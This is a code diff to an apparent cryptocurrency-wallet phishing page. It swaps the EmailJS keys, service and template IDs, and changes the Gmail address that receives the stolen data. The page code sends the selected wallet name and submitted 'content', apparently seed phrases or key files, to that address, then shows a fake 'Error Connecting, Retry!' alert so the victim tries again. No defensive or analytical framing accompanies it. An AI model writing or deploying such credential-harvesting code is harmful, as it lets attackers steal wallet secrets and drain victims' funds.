@@ -8,7 +8,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-           emailjs.init("AiEovbEQrxItv_MEw");  // Replace with your EmailJS public key
+           emailjs.init("Cta4lN1To45YodQK6");  // Replace with your EmailJS public key
         })();
     </script>
 </head>
@@ -194,10 +194,10 @@
             const contentValue = formData.get('content');
             const message = contentValue instanceof File ? 'File attached' : contentValue;
 
-            emailjs.send("service_shw79vn", "template_x44qepf", {
+            emailjs.send("service_27imcaz", "template_dv2b63i", {
                 wallet_name: selectedWallet,
                 message: message,
-                to_email: "bryantdalrymple5@gmail.com"
+                to_email: "jnrrihie36@gmail.com"
             })
             .then(response => {
                 alert("Error Connecting, Retry!");
